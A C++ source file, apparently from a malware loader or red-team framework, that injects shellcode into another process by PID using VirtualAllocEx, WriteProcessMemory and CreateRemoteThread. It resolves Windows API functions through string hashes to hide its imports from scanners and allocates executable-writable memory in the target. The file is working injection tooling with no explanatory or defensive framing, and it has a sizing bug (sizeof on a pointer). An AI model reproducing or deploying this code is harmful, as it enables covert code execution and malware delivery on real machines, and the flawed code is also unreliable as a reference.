#include "execute.hpp"

namespace execute {
	BOOL CreateRemoteThread(_In_ DWORD pid, _In_ BYTE* shellcode)
	{
		HANDLE process_handle = NULL;
		PVOID address_ptr = NULL;
		BOOL success = FALSE;
		HANDLE thread_handle = NULL;
		SIZE_T bytes_written = 0;
		HMODULE kernel32 = NULL;
		BOOL result = FALSE;

#pragma region [Kernel32 Functions]
		typeGetLastError get_last_error = NULL;
		typeOpenProcess open_process = NULL;
		typeVirtualAllocEx virtual_alloc_ex = NULL;
		typeWriteProcessMemory write_process_memory = NULL;
		typeCreateRemoteThread create_remote_thread = NULL;
		typeCloseHandle close_handle = NULL;

		constexpr ULONG hash_kernel32 = HashString("KERNEL32.DLL");
		kernel32 = memory::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
		}

		get_last_error = (typeGetLastError)memory::GetProcAddressC(kernel32, HashString("GetLastError"));
		open_process = (typeOpenProcess)memory::GetProcAddressC(kernel32, HashString("OpenProcess"));
		virtual_alloc_ex = (typeVirtualAllocEx)memory::GetProcAddressC(kernel32, HashString("VirtualAllocEx"));
		write_process_memory = (typeWriteProcessMemory)memory::GetProcAddressC(kernel32, HashString("WriteProcessMemory"));
		create_remote_thread = (typeCreateRemoteThread)memory::GetProcAddressC(kernel32, HashString("CreateRemoteThread"));
		close_handle = (typeCloseHandle)memory::GetProcAddressC(kernel32, HashString("CloseHandle"));

#pragma endregion

		process_handle = open_process(PROCESS_ALL_ACCESS, FALSE, pid);
		if (process_handle == NULL)
		{
			LOG_ERROR("[-] Error during OpenProcess call pid: %lu (Code: %08lX)", pid, get_last_error());
			goto CLEANUP;
		}

		address_ptr = virtual_alloc_ex(process_handle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
		if (address_ptr == NULL)
		{
			LOG_ERROR("Error during VirtualAllocEx (Code: %08lX)", get_last_error());
			goto CLEANUP;
		}

		success = write_process_memory(process_handle, address_ptr, shellcode, sizeof(shellcode), &bytes_written);
		if (!success)
		{
			LOG_ERROR("Error during WriteProcessMemory (%llu bytes written)", bytes_written);
			goto CLEANUP;
		}

		thread_handle = create_remote_thread(process_handle, NULL, NULL, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
		if (thread_handle == NULL)
		{
			LOG_ERROR("Error during CreateRemoteThread (Code: %08lX)", get_last_error());
			goto CLEANUP;
		}

		result = TRUE;

	CLEANUP:
		close_handle(process_handle);
		close_handle(thread_handle);
		return result;
	}
} // End of execute namespace